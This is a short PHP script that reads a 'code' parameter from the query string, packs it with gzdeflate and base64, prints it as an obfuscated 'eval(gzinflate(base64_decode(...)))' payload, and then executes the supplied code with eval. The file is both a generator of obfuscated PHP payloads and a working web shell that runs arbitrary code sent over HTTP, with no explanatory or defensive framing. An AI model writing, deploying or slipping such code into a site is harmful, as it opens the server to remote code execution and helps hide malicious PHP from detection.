<?php
	$input = $_GET['code'];
	$result = (base64_encode(gzdeflate($input)));
	echo "payload: eval(gzinflate(base64_decode('$result')))" ;
	eval(gzinflate(base64_decode($result)));
?>
